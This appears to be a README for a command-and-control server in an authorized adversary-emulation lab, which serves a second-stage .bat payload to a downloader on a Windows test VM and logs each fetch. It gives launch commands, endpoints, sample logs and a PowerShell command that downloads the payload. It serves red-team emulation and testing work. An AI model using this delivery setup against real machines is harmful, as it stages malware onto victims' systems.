# BadDownloader C2 Server

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This C2 server runs on your local development machine to serve the .bat
payload and log requests. It does NOT connect to external infrastructure.

C2 Address: 192.168.0.148:8888 (your MacBook on the lab network)
============================================================================
```

## Overview

The C2 server provides two functions:
1. **Payload delivery** — Serves `baddownload.bat` to the downloader cradle
2. **Request logging** — Logs each fetch with timestamp and source IP for video recording

Unlike JawDropper, BadDownloader does not beacon — its only network event is the single GET for the .bat file.

## Quick Start

### Option 1: Simple

Just use Python's built-in HTTP server from the payload directory:

```bash
cd baddownloader/stage2-payload
python3 -m http.server 8888
```

This serves `baddownload.bat` from `http://192.168.0.148:8888/baddownload.bat`.

### Option 2: Enhanced (recommended for video recording)

Use the custom C2 server for request logging and a status page:

```bash
python3 baddownloader/c2-server/server.py --port 8888
```

This provides:
- A web status page at `http://localhost:8888/` showing recent payload requests
- Timestamped console logging of payload deliveries
- Camera-friendly output

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Status page with recent requests |
| `/baddownload.bat` | GET | Serve the .bat payload (logged) |

## Command-Line Options

```
usage: server.py [-h] [--port PORT] [--serve-dir DIR] [--bind ADDR]

BadDownloader C2 Server - Esinta Emulation

options:
  -h, --help            show this help message and exit
  --port PORT, -p PORT  Port to listen on (default: 8888)
  --serve-dir DIR, -d   Directory to serve files from (default: ../stage2-payload/)
  --bind ADDR, -b ADDR  Address to bind to (default: 0.0.0.0)
```

## Console Output

The server produces camera-friendly output:

```
======================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
======================================================================

BadDownloader C2 Server

  Listening:      http://0.0.0.0:8888
  Serving files:  /Users/you/Emulation/baddownloader/stage2-payload
  Status page:    http://localhost:8888/
  Payload URL:    http://192.168.0.148:8888/baddownload.bat

Waiting for connections... (Ctrl+C to stop)
----------------------------------------------------------------------
[2026-04-27 15:04:12] PAYLOAD REQUEST → baddownload.bat (from 192.168.0.161)
[2026-04-27 15:04:12] PAYLOAD DELIVERED → baddownload.bat (0.5 KB)
```

## Network Requirements

The C2 server must be reachable from your Windows test VM:

1. Run the server on your MacBook (192.168.0.148)
2. Ensure the Windows VM can reach port 8888
3. The downloader has `192.168.0.148:8888` hardcoded in `downloader.c` — if your IP differs, either alias `.148` onto your interface or edit the source and rebuild

### Testing Connectivity

From the Windows VM:
```powershell
Invoke-WebRequest -Uri "http://192.168.0.148:8888/baddownload.bat" -OutFile test.bat
Get-Item test.bat
```

## Dependencies

None — uses Python standard library only.

- `http.server` — HTTP server
- `datetime` — Timestamps
- `argparse` — Command-line parsing
